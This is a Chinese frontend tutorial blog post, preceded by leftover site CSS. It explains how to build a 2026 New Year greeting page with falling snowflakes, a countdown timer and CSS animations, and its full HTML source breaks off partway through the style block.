/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>新年将至，你是否想为亲友制作一个特别的新年祝福页面？今天我们就来一起拆解一个精美的 2026 新年祝福页面的完整实现过程。这个页面包含了加载动画、动态倒计时、雪花特效、悬浮祝福卡片等炫酷效果，完全使用 HTML、CSS 和 JavaScript 实现。</p>
<hr/>
<p><em>大家复制代码时，可能会因格式转换出现错乱，导致样式失效。建议先少量复制代码进行测试，若未能解决问题，私信回复源码两字，我会发送完整的压缩包给你。</em></p>
<h2 data-id="heading-0">演示效果</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b2da117a80f94f87aaeb564325da7582~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uvSGFyZHk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767780329&amp;x-signature=DBRuu1K0yevI%2Fpk3r3FtfyLHiVU%3D" alt="演示效果" loading="lazy"/></p>
<h2 data-id="heading-1">代码讲解</h2>
<p><strong>雪花生成算法</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createSnowflake</span>(<span class="hljs-params">container, index</span>) {
  <span class="hljs-keyword">const</span> snowflake = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);

  <span class="hljs-comment">// 随机属性：大小、位置、时长</span>
  <span class="hljs-keyword">const</span> size = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">5</span> + <span class="hljs-number">2</span>;
  <span class="hljs-keyword">const</span> x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span>;
  <span class="hljs-keyword">const</span> duration = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">10</span> + <span class="hljs-number">5</span>;
  <span class="hljs-keyword">const</span> delay = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">5</span>;

  <span class="hljs-comment">// 设置基础样式</span>
  snowflake.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'snowflake'</span>);
  snowflake.<span class="hljs-property">style</span>.<span class="hljs-property">left</span> = <span class="hljs-string">`<span class="hljs-subst">${x}</span>%`</span>;
  snowflake.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">`<span class="hljs-subst">${size}</span>px`</span>;
  snowflake.<span class="hljs-property">style</span>.<span class="hljs-property">height</span> = <span class="hljs-string">`<span class="hljs-subst">${size}</span>px`</span>;
}
</code></pre>
<p><strong>雪花飘落动画</strong></p>
<pre><code class="hljs language-js" lang="js">snowflake.<span class="hljs-title function_">animate</span>(
  [
    { <span class="hljs-attr">transform</span>: <span class="hljs-string">'translate(0, -20px) rotate(0deg)'</span> },
    { <span class="hljs-attr">transform</span>: <span class="hljs-string">`translate(<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.sin(duration)*<span class="hljs-number">50</span>}</span>px, 100vh) rotate(90deg)`</span> },
    { <span class="hljs-attr">transform</span>: <span class="hljs-string">`translate(<span class="hljs-subst">${-<span class="hljs-built_in">Math</span>.sin(duration)*<span class="hljs-number">25</span>}</span>px, 100vh) rotate(180deg)`</span> },
    { <span class="hljs-attr">transform</span>: <span class="hljs-string">'translate(0, 100vh) rotate(360deg)'</span> },
  ],
  {
    <span class="hljs-attr">duration</span>: duration * <span class="hljs-number">1000</span>,
    <span class="hljs-attr">delay</span>: delay * <span class="hljs-number">1000</span>,
    <span class="hljs-attr">iterations</span>: <span class="hljs-title class_">Infinity</span>,
    <span class="hljs-attr">easing</span>: <span class="hljs-string">'linear'</span>
  }
);
</code></pre>
<ul>
<li>使用 Math.sin()制造左右摆动的飘落路径</li>
<li>为每个雪花设置不同的延迟和时长，增加真实感</li>
<li>无限循环（Infinity）实现持续飘落</li>
<li>响应式设计：根据屏幕宽度调整雪花数量</li>
</ul>
<p><strong>时间计算逻辑</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateCountdown</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> now = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
  <span class="hljs-keyword">const</span> newYear = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-number">2026</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> difference = newYear.<span class="hljs-title function_">getTime</span>() - now.<span class="hljs-title function_">getTime</span>();

  <span class="hljs-comment">// 计算天、时、分、秒</span>
  <span class="hljs-keyword">const</span> days = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(difference / (<span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span>));
  <span class="hljs-keyword">const</span> hours = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((difference / (<span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span>)) % <span class="hljs-number">24</span>);
  <span class="hljs-keyword">const</span> minutes = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((difference / <span class="hljs-number">1000</span> / <span class="hljs-number">60</span>) % <span class="hljs-number">60</span>);
  <span class="hljs-keyword">const</span> seconds = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((difference / <span class="hljs-number">1000</span>) % <span class="hljs-number">60</span>);
}
</code></pre>
<p><strong>数字格式化</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 两位数格式化</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'seconds'</span>).<span class="hljs-property">textContent</span> =
  <span class="hljs-title class_">String</span>(seconds).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>);
</code></pre>
<ul>
<li>使用 setInterval(updateCountdown, 1000)实现秒级更新</li>
<li>padStart()确保始终显示两位数字</li>
<li>防抖处理避免性能问题</li>
</ul>
<p><strong>自定义动画定义</strong></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-keyword">@keyframes</span> float {
  <span class="hljs-number">0%</span> { <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">0px</span>); }
  <span class="hljs-number">50%</span> { <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">15px</span>); }
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">0px</span>); }
}

<span class="hljs-keyword">@keyframes</span> glow {
  <span class="hljs-number">0%</span>, <span class="hljs-number">100%</span> {
    <span class="hljs-attribute">text-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">215</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.5</span>);
  }
  <span class="hljs-number">50%</span> {
    <span class="hljs-attribute">text-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">20px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">215</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.8</span>);
  }
}
</code></pre>
<h2 data-id="heading-2">一键复制源码</h2>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>2026新年祝福 - 元旦快乐<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"</span>
        <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">"anonymous"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.tailwindcss.com"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-comment">// Tailwind CSS 配置</span>
        tailwind.<span class="hljs-property">config</span> = {
            <span class="hljs-attr">theme</span>: {
                <span class="hljs-attr">extend</span>: {
                    <span class="hljs-attr">colors</span>: {
                        <span class="hljs-attr">primary</span>: <span class="hljs-string">'#ef4444'</span>,
                        <span class="hljs-attr">secondary</span>: <span class="hljs-string">'#f59e0b'</span>,
                    },
                    <span class="hljs-attr">fontFamily</span>: {
                        <span class="hljs-attr">sans</span>: [<span class="hljs-string">'Inter'</span>, <span class="hljs-string">'system-ui'</span>, <span class="hljs-string">'sans-serif'</span>],
                    },
                },
            }
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/tailwindcss"</span>&gt;</span><span class="css">
        <span class="hljs-keyword">@layer</span> utilities {
        <span class="hljs-selector-class">.content-auto</span> {
          <span class="hljs-attribute">content-visibility</span>: auto;
        }
        <span class="hljs-selector-class">.text-shadow-glow</span> {
          <span class="hljs-attribute">text-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">215</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.7</span>), <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">20px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">215</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.5</span>);
        }
        <span class="hljs-selector-class">.animate-float</span> {
          <span class="hljs-attribute">animation</span>: float <span class="hljs-number">4s</span> ease-in-out infinite;
        }
        <span class="hljs-selector-class">.animate-float-delay-1</span> {
          <span class="hljs-attribute">animation</span>: float <span class="hljs-number">4s</span> ease-in-out <span class="hljs-number">1s</span> infinite;
        }
        <span class="hljs-selector-class">.animate-float-delay-2</span> {
          <span class="hljs-attribute">animation</span>: float <span class="hljs-number">4s</span> ease-in-out <span class="hljs-number">2s</span> infinite;
        }
        <span class="hljs-selector-class">.animate-float-delay-3</span> {
          <span class="hljs-attribute">animation</span>: float <span class="hljs-number">4s</span> ease-in-out <span class="hljs-number">3s</span> infinite;
        }
        <span class="hljs-selector-class">.animate-pulse-soft</span> {
          <span class="hljs-attribute">animation</span>: pulseSoft <span class="hljs-number">2s</span> ease-in-out infinite;
        }
        <span class="hljs-selector-class">.animate-fade-in</span> {
          <span class="hljs-attribute">animation</span>: fadeIn <span class="hljs-number">1s</span> ease-out forwards;
        }
        <span class="hljs-selector-class">.animate-slide-up</span> {
          <span class="hljs-attribute">animation</span>: slideUp <span class="hljs-number">1s</span> ease-out forwards;
        }
        <span class="hljs-selector-class">.animate-slide-up-delay-1</span> {
          <span class="hljs-attribute">animation</span>: slideUp <span class="hljs-number">1s</span> ease-out <span class="hljs-number">0.3s</span> forwards;
        }
        <span class="hljs-selector-class">.animate-slide-up-delay-2</span> {
          <span class="hljs-attribute">animation</span>: slideUp <span class="hljs-number">1s</span> ease-out <span class="hljs-number">0.6s</span> forwards;
        }
        <span class="hljs-selector-class">.animate-slide-up-delay-3</span> {
          <span class="hljs-attribute">animation</span>: slideUp <span class="hljs-number">1s</span> ease-out <span class="hljs-number">0.9s</span> forwards;
        }
        <span class="hljs-selector-class">.animate-scale-in</span> {
          <span class="hljs-attribute">animation</span>: scaleIn <span class="hljs-number">0.5s</span> ease-out forwards;
        }
        <span class="hljs-selector-class">.animate-glow</span> {
          <span class="hljs-attribute">animation</span>: glow <span class="hljs-number">2s</span> ease-in-out infinite;
        }
      }

      <span class="hljs-keyword">@keyframes</span> float {
        <span class="hljs-number">0%</span> { <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">0px</span>); }
        <span class="hljs-number">50%</span> { <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">15px</span>); }
        <span class="hljs-number">100%</span> { <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">0px</span>); }
      }

      <span class="hljs-keyword">@keyframes</span> pulseSoft {
        <span class="hljs-number">0%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.7</span>; }
        <span class="hljs-number">50%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; }
        <span class="hljs-number">100%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.7</span>; }
      }

      <span class="hljs-keyword">@keyframes</span> fadeIn {
        <span class="hljs-selector-tag">from</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>; }
        <span class="hljs-selector-tag">to</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; }
      }

      <span class="hljs-keyword">@keyframes</span> slideUp {
        <span class="hljs-selector-tag">from</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">50px</span>); }
        <span class="hljs-selector-tag">to</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">0</span>); }
      }

      <span class="hljs-keyword">@keyframes</span> scaleIn {
        <span class="hljs-selector-tag">from</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">0.9</span>); }
        <span class="hljs-selector-tag">to</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1</span>); }
      }

      <span class="hljs-keyword">@keyframes</span> glow {
        <span class="hljs-number">0%</span>, <span class="hljs-number">100%</span> { <span class="hljs-attribute">text-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">215</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.5</span>); }
        <span class="hljs-number">50%</span> { <span class="hljs-attribute">text-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">20px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">215</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.8</span>); }
      }

      <span class="hljs-comment">/* 全局样式 */</span>
      <span class="hljs-selector-tag">html</span>, <span class="hljs-selector-tag">body</span> {
        <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
        <span class="hljs-attribute">overflow-x</span>: hidden;
